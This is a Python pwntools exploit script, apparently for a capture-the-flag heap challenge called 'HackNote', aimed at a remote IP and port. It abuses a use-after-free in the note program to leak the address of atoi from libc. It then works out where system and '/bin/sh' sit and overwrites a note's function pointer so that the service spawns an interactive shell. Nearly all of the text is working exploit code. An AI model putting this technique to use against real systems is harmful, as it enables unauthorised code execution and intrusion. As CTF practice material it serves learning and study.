from pwn import *
from LibcSearcher import *
context(log_level = 'debug')

# io = process('./pwn')
io = remote('111.200.241.244', 56585)

def create(size, content):
	io.sendlineafter(b'Your choice :', b'1')
	io.sendlineafter(b'Note size :', str(size).encode())
	io.sendafter(b'Content :', content)

def delete(index):
	io.sendlineafter(b'Your choice :', b'2')
	io.sendlineafter(b'Index :', str(index).encode())

def show(index):
	io.sendlineafter(b'Your choice :', b'3')
	io.sendlineafter(b'Index :', str(index).encode())


create(32, b'deadbeef\n')
create(32, b'deadbeef\n')
delete(0)
delete(1)

got_addr = 0x804A008

payload = p32(got_addr)

create(8, p32(0x804862B) + p32(0x804A034))
show(0)		# get the memory address of function atoi()
mem_atoi_addr = u32(io.recvuntil(b'HackNote')[0:4])
delete(2)

# libc = LibcSearcher('atoi', mem_atoi_addr)
# libc_base = mem_atoi_addr - libc.dump('atoi')
# mem_sys_addr = libc.dump('system') + libc_base
# mem_binsh_addr = libc.dump('str_bin_sh') + libc_base
libc = ELF('libc_32.so.6')
libc_base = mem_atoi_addr - libc.symbols['atoi']
mem_sys_addr = libc_base + libc.symbols['system']
mem_binsh_addr = libc_base + next(libc.search(b'/bin/sh'))
print(hex(next(libc.search(b'/bin/sh'))))

create(8, p32(mem_sys_addr) + b'||sh')
create(32, b'/bin/sh')
show(0)

io.interactive()

# payload = p64(0) + p32()
# create(0x100, cyclic(0x100))